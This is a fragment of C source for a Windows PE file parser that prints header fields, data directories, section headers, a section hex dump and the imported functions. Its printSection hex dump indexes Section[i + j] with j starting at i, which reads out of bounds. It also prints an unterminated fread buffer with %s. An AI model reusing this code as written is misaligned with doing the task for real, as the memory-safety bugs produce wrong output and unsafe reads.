    printf("SizeOfHeaders:               0x%lX\n", OptionalHeader.SizeOfHeaders);
    printf("CheckSum:                    0x%lX\n", OptionalHeader.CheckSum);
    printf("Subsystem:                   0x%X\n" , OptionalHeader.Subsystem);
    printf("DllCharacteristics:          0x%X\n" , OptionalHeader.DllCharacteristics);
    printf("SizeOfStackReserve:          0x%lX\n", OptionalHeader.SizeOfStackReserve);
    printf("SizeOfStackCommit:           0x%lX\n", OptionalHeader.SizeOfStackCommit);
    printf("SizeOfHeapReserve:           0x%lX\n", OptionalHeader.SizeOfHeapReserve);
    printf("SizeOfHeapCommit:            0x%lX\n", OptionalHeader.SizeOfHeapCommit);
    printf("LoaderFlags:                 0x%lX\n", OptionalHeader.LoaderFlags);
    printf("NumberOfRvaAndSizes:         0x%lX\n", OptionalHeader.NumberOfRvaAndSizes);
    printf("---------Data Directories----------\n");
    UCHAR * DirectoryTableName[16] = {
        "Export Table",
        "Import Table",
        "Resource Table",
        "Exception Table",
        "Certificate Table",
        "Base Relocation Table",
        "Debug",
        "Architecture",
        "Global Ptr",
        "TLS Table",
        "Load Config Table",
        "Bound Import",
        "IAT",
        "Delay Import Descriptor",
        "CLR Runtime Header",
        "Reserved"
    };

    for (DWORD i = 0; i < OptionalHeader.NumberOfRvaAndSizes; i++){
        if (OptionalHeader.DataDirectory[i].Size == 0) continue;
        printf("%s\n", DirectoryTableName[i]);
        printf("Size: %ld\n", OptionalHeader.DataDirectory[i].Size);
        printf("Virtual Address: 0x%lX\n", OptionalHeader.DataDirectory[i].VirtualAddress);
        printf("\n");
    }
}

void printSectionHeaders(IMAGE_SECTION_HEADER SectionHeaders[], int NumberOfSections){
    printf("========================SECTION HEADERS===============================\n");
    for (int i = 0; i < NumberOfSections; i++){
        printf("--------%.8s-----------\n", SectionHeaders[i].Name);
        printf("VirtualSize:          0x%lX\n", SectionHeaders[i].Misc.VirtualSize);
        printf("VirtualAddress:       0x%lX\n", SectionHeaders[i].VirtualAddress);
        printf("SizeOfRawData:        0x%lX\n", SectionHeaders[i].SizeOfRawData);
        printf("PointerToRawData:     0x%lX\n", SectionHeaders[i].PointerToRawData);
        printf("PointerToRelocations: 0x%lX\n", SectionHeaders[i].PointerToRelocations);
        printf("PointerToLinenumbers: 0x%lX\n", SectionHeaders[i].PointerToLinenumbers);
        printf("NumberOfRelocations:  0x%X\n" , SectionHeaders[i].NumberOfRelocations);
        printf("NumberOfLinenumbers:  0x%X\n" , SectionHeaders[i].NumberOfLinenumbers);
        printf("Characteristics:      0x%lX\n", SectionHeaders[i].Characteristics);
    }
}

void printSection(IMAGE_SECTION_HEADER SectionHeader, UCHAR Section[]){
    printf("--------%.8s-----------\n", SectionHeader.Name);
    
    // Print first index line
    printf("            ");
    for (int i = 0; i < 16; i++)  
        printf("%.2X ", i);
    printf("\n");

    for (DWORD i = 0; i < SectionHeader.SizeOfRawData; i+=16){
        printf("0x%.8lX: ", SectionHeader.PointerToRawData + i); // Print Raw Address of this data area
        for (DWORD j = i; j < i + 16; j++)
            printf("%.2X ", Section[i + j]);
        printf("\n");
    }
}

void printAllImportedSymbol(FILE *FStream){
    rewind(FStream);
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeader;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    readPE32Header(FStream, &DOSHeader, &NTHeader, SectionHeaders);
    
    IMAGE_IMPORT_DESCRIPTOR ImportedDLLs[MAX_IMPORTED_DLL];
    int IndexOfSectionHeader;
    readPEImportTable(
        FStream, 
        SectionHeaders, 
        NTHeader.FileHeader.NumberOfSections, 
        NTHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
        ImportedDLLs,
        &IndexOfSectionHeader
        );

    const int MAX_BUFFER = 0xff;
    UCHAR * Buffer = (UCHAR *) malloc(MAX_BUFFER);

    int i = 0;
    LOOKUP_ELEMENT LookUpTable[MAX_IMPORTED_FUNC];
    IMAGE_SECTION_HEADER sh = SectionHeaders[IndexOfSectionHeader];
    IMAGE_IMPORT_DESCRIPTOR zeroImportedDLL;
    memset(&zeroImportedDLL, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR));
    while (1){
        if (memcmp(ImportedDLLs + i, &zeroImportedDLL, sizeof(IMAGE_IMPORT_DESCRIPTOR)) == 0)
            break;
        
        DWORD NameOffset = rva2Offset(ImportedDLLs[i].Name, sh);
        
        fseek(FStream, NameOffset, SEEK_SET);
        fread(Buffer, 1, 0xff, FStream);
        printf("-------------%s-----------\n", Buffer);

        printf("Name\t\t\t\tOrdinal\t\t\t\tAddress\n");

        int j = 0;
        extractLookupTable(FStream, sh, ImportedDLLs[i], LookUpTable);
        while (1) {
            if (LookUpTable[j].Ordinal == 0)
                break;

            printf("%-32s%-32d0x%-x\n", 
                LookUpTable[j].Name, 
                LookUpTable[j].Ordinal & 0x80000000 ? LookUpTable[j].Ordinal & 0xFFFF : 0, 
                LookUpTable[j].Address + NTHeader.OptionalHeader.ImageBase
            );

            j++;
        }

        i++;
    }
    free(Buffer);
}
#endif
/*
int main(){

    FILE *f = fopen("179906902", "rb");
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeaders;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    //readPE32Header(f, &DOSHeader, &NTHeaders, SectionHeaders);
    printAllImportedSymbol(f);
    //DWORD d = findFuncAddressByName(f, "KERNEL32.dll", "LoadLibraryA");
    //printf("%d", d);
    fclose(f);
    //fclose(newf);
    //printDOSHeader(DOSHeader);
    //printSectionHeaders(SectionHeaders, NTHeaders.FileHeader.NumberOfSections);
    return 0;
}
*/